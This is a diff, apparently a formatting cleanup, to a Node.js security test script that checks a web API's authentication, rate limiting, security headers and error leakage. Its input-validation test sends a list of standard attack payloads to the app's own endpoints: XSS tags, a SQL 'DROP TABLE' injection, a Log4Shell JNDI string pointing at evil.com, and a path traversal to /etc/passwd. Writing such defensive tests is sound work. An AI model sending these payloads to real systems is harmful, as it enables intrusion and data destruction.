@@ -17,23 +17,23 @@ const TEST_TIMEOUT = 10000
 function makeRequest(options, data = null) {
   return new Promise((resolve, reject) => {
     const protocol = options.protocol === 'https:' ? https : http
-    
-    const req = protocol.request(options, (res) => {
+
+    const req = protocol.request(options, res => {
       let body = ''
-      res.on('data', chunk => body += chunk)
+      res.on('data', chunk => (body += chunk))
       res.on('end', () => {
         try {
           const jsonBody = body ? JSON.parse(body) : {}
           resolve({
             status: res.statusCode,
             headers: res.headers,
-            body: jsonBody
+            body: jsonBody,
           })
         } catch {
           resolve({
             status: res.statusCode,
             headers: res.headers,
-            body: body
+            body: body,
           })
         }
       })
@@ -48,7 +48,7 @@ function makeRequest(options, data = null) {
     if (data) {
       req.write(JSON.stringify(data))
     }
-    
+
     req.end()
   })
 }
@@ -58,7 +58,7 @@ function makeRequest(options, data = null) {
  */
 async function testAuthentication() {
   console.log('\n🔐 Testing Authentication...')
-  
+
   const tests = [
     {
       name: 'Login with invalid credentials',
@@ -66,9 +66,9 @@ async function testAuthentication() {
         method: 'POST',
         path: '/api/auth',
         headers: { 'Content-Type': 'application/json' },
-        data: { username: 'invalid', password: 'invalid' }
+        data: { username: 'invalid', password: 'invalid' },
       },
-      expectedStatus: 401
+      expectedStatus: 401,
     },
     {
       name: 'Login without credentials',
@@ -76,18 +76,18 @@ async function testAuthentication() {
         method: 'POST',
         path: '/api/auth',
         headers: { 'Content-Type': 'application/json' },
-        data: {}
+        data: {},
       },
-      expectedStatus: 400
+      expectedStatus: 400,
     },
     {
       name: 'Check session without authentication',
       request: {
         method: 'GET',
-        path: '/api/auth'
+        path: '/api/auth',
       },
-      expectedStatus: 401
-    }
+      expectedStatus: 401,
+    },
   ]
 
   for (const test of tests) {
@@ -98,11 +98,11 @@ async function testAuthentication() {
         port: url.port,
         path: url.pathname,
         method: test.request.method,
-        headers: test.request.headers || {}
+        headers: test.request.headers || {},
       }
 
       const response = await makeRequest(options, test.request.data)
-      
+
       if (response.status === test.expectedStatus) {
         console.log(`  ✅ ${test.name}`)
       } else {
@@ -119,20 +119,20 @@ async function testAuthentication() {
  */
 async function testInputValidation() {
   console.log('\n🛡️ Testing Input Validation...')
-  
+
   const maliciousPayloads = [
     '<script>alert("xss")</script>',
     "'; DROP TABLE users; --",
     '${jndi:ldap://evil.com/a}',
     '../../../etc/passwd',
     'javascript:alert(1)',
-    '<img src=x onerror=alert(1)>'
+    '<img src=x onerror=alert(1)>',
   ]
 
   const endpoints = [
     { path: '/api/search', method: 'POST', field: 'query' },
     { path: '/api/scrape', method: 'POST', field: 'url' },
-    { path: '/api/geocode', method: 'POST', field: 'address' }
+    { path: '/api/geocode', method: 'POST', field: 'address' },
   ]
 
   for (const endpoint of endpoints) {
@@ -147,15 +147,17 @@ async function testInputValidation() {
           port: url.port,
           path: url.pathname,
           method: endpoint.method,
-          headers: { 'Content-Type': 'application/json' }
+          headers: { 'Content-Type': 'application/json' },
         }
 
         const response = await makeRequest(options, data)
-        
+
         if (response.status === 400) {
           console.log(`  ✅ ${endpoint.path} rejected malicious ${endpoint.field}`)
         } else {
-          console.log(`  ⚠️  ${endpoint.path} accepted malicious ${endpoint.field} (status: ${response.status})`)
+          console.log(
+            `  ⚠️  ${endpoint.path} accepted malicious ${endpoint.field} (status: ${response.status})`
+          )
         }
       } catch (error) {
         console.log(`  ❌ Error testing ${endpoint.path}: ${error.message}`)
@@ -169,7 +171,7 @@ async function testInputValidation() {
  */
 async function testRateLimiting() {
   console.log('\n⏱️ Testing Rate Limiting...')
-  
+
   const endpoint = '/api/health'
   const requests = 10
   let rateLimited = false
@@ -181,11 +183,11 @@ async function testRateLimiting() {
         hostname: url.hostname,
         port: url.port,
         path: url.pathname,
-        method: 'GET'
+        method: 'GET',
       }
 
       const response = await makeRequest(options)
-      
+
       if (response.status === 429) {
         rateLimited = true
         console.log(`  ✅ Rate limiting triggered after ${i + 1} requests`)
@@ -207,12 +209,8 @@ async function testRateLimiting() {
  */
 async function testSecurityHeaders() {
   console.log('\n🔒 Testing Security Headers...')
-  
-  const requiredHeaders = [
-    'x-content-type-options',
-    'x-frame-options',
-    'x-xss-protection'
-  ]
+
+  const requiredHeaders = ['x-content-type-options', 'x-frame-options', 'x-xss-protection']
 
   try {
     const url = new URL(BASE_URL + '/api/health')
@@ -220,11 +218,11 @@ async function testSecurityHeaders() {
       hostname: url.hostname,
       port: url.port,
       path: url.pathname,
-      method: 'GET'
+      method: 'GET',
     }
 
     const response = await makeRequest(options)
-    
+
     for (const header of requiredHeaders) {
       if (response.headers[header]) {
         console.log(`  ✅ ${header}: ${response.headers[header]}`)
@@ -252,7 +250,7 @@ async function testSecurityHeaders() {
  */
 async function testErrorHandling() {
   console.log('\n🚨 Testing Error Handling...')
-  
+
   const tests = [
     {
       name: 'Invalid JSON payload',
@@ -260,8 +258,8 @@ async function testErrorHandling() {
         method: 'POST',
         path: '/api/search',
         headers: { 'Content-Type': 'application/json' },
-        rawData: '{"invalid": json}'
-      }
+        rawData: '{"invalid": json}',
+      },
     },
     {
       name: 'Missing required fields',
@@ -269,16 +267,16 @@ async function testErrorHandling() {
         method: 'POST',
         path: '/api/search',
         headers: { 'Content-Type': 'application/json' },
-        data: {}
-      }
+        data: {},
+      },
     },
     {
       name: 'Invalid endpoint',
       request: {
         method: 'GET',
-        path: '/api/nonexistent'
-      }
-    }
+        path: '/api/nonexistent',
+      },
+    },
   ]
 
   for (const test of tests) {
@@ -289,11 +287,11 @@ async function testErrorHandling() {
         port: url.port,
         path: url.pathname,
         method: test.request.method,
-        headers: test.request.headers || {}
+        headers: test.request.headers || {},
       }
 
       const response = await makeRequest(options, test.request.data)
-      
+
       // Check if error response doesn't leak sensitive information
       const bodyStr = JSON.stringify(response.body).toLowerCase()
       const sensitivePatterns = [
@@ -302,7 +300,7 @@ async function testErrorHandling() {
         'database',
         'password',
         'secret',
-        'token'
+        'token',
       ]
 
       let leaksInfo = false
@@ -338,13 +336,12 @@ async function runSecurityTests() {
     await testRateLimiting()
     await testSecurityHeaders()
     await testErrorHandling()
-    
+
     console.log('\n✅ Security testing completed!')
     console.log('\n📋 Summary:')
     console.log('- Review any ⚠️  warnings above')
     console.log('- Fix any ❌ failures before deployment')
     console.log('- Ensure all ✅ tests are passing')
-    
   } catch (error) {
     console.error('\n❌ Security testing failed:', error.message)
     process.exit(1)
@@ -362,5 +359,5 @@ module.exports = {
   testInputValidation,
   testRateLimiting,
   testSecurityHeaders,
-  testErrorHandling
+  testErrorHandling,
 }
